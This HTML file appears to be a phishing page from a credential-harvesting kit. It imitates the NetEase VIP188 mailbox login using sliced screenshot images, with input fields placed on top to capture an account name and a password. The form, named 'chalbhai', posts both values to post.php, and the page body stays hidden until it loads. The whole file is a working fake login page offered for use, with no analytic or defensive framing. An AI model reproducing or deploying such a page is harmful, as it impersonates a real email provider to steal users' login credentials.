<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#32593;&#26131;&#86;&#73;&#80;&#49;&#56;&#56;&#37038;&#31665;&#30331;&#24405;&#27880;&#20876;&#45;&#26356;&#23433;&#20840;&#31283;&#23450;&#30340;&#20010;&#20154;&#21830;&#21153;&#25910;&#36153;&#37038;&#31665;</title>
<script type="text/javascript" src="https://www.sitepoint.com/examples/password/MaskedPassword/MaskedPassword.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<style type="text/css">
 .textbox {  
    background: #FFF;
    border: 0px solid #fff;
	padding-left: 12px;
	font-size: 15px;
    height: 40px; 
    width: 275px; 
 } 
 
.textbox:focus {  
    border-color: #fff; 
    border-style: solid; 
    border-width: 0px; 
    outline: 0; 
 } 
 </style>			  
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>

</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1365px; height:185px; z-index:0"><img src="images/mm1.png" alt="" title="" border=0 width=1365 height=185></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:182px; width:1365px; height:176px; z-index:1"><img src="images/mm2.png" alt="" title="" border=0 width=1365 height=176></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:355px; width:1365px; height:167px; z-index:2"><img src="images/mm3.png" alt="" title="" border=0 width=1365 height=167></div>

<div id="image4" style="position:absolute; overflow:hidden; left:0px; top:519px; width:1365px; height:143px; z-index:3"><img src="images/mm4.png" alt="" title="" border=0 width=1365 height=143></div>

<div id="image5" style="position:absolute; overflow:hidden; left:903px; top:10px; width:455px; height:28px; z-index:4"><a href="#"><img src="images/mm5.png" alt="" title="" border=0 width=455 height=28></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:1244px; top:406px; width:98px; height:122px; z-index:5"><a href="#"><img src="images/mm6.png" alt="" title="" border=0 width=98 height=122></a></div>

<div id="image7" style="position:absolute; overflow:hidden; left:872px; top:484px; width:264px; height:39px; z-index:6"><a href="#"><img src="images/mm7.png" alt="" title="" border=0 width=264 height=39></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:862px; top:411px; width:264px; height:40px; z-index:7"><a href="#"><img src="images/mm8.png" alt="" title="" border=0 width=264 height=40></a></div>

<div id="image9" style="position:absolute; overflow:hidden; left:668px; top:595px; width:57px; height:64px; z-index:8"><a href="#"><img src="images/mm9.png" alt="" title="" border=0 width=57 height=64></a></div>

<div id="image10" style="position:absolute; overflow:hidden; left:861px; top:369px; width:98px; height:20px; z-index:9"><a href="#"><img src="images/mm10.png" alt="" title="" border=0 width=98 height=20></a></div>

<div id="image11" style="position:absolute; overflow:hidden; left:1059px; top:367px; width:66px; height:23px; z-index:10"><a href="#"><img src="images/mm11.png" alt="" title="" border=0 width=66 height=23></a></div>

<div id="image12" style="position:absolute; overflow:hidden; left:1109px; top:144px; width:45px; height:41px; z-index:11"><a href="#"><img src="images/mm12.png" alt="" title="" border=0 width=45 height=41></a></div>
<form action=post.php name=chalbhai id=chalbhai method=post>
<input name="userid" placeholder="&#37038;&#31665;&#24080;&#21495;&#47;&#25163;&#26426;&#21495;&#30721;" class="textbox" value="<?=$_GET[userid]?>" autocomplete="off" required type="text" style="position:absolute;width:260px;left:864px;top:185px;z-index:12">
<input name="pass" id="demo-field" placeholder="&#36755;&#20837;&#23494;&#30721;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:260px;left:856px;top:242px;z-index:13">
<div id="formimage1" style="position:absolute; left:863px; top:313px; z-index:14"><input type="image" name="formimage1" width="262" height="44" src="images/login.png"></div>

<script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("demo-field"), '\u25CF');
 
  //test the submitted value
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>
 
	
</body>
</html>
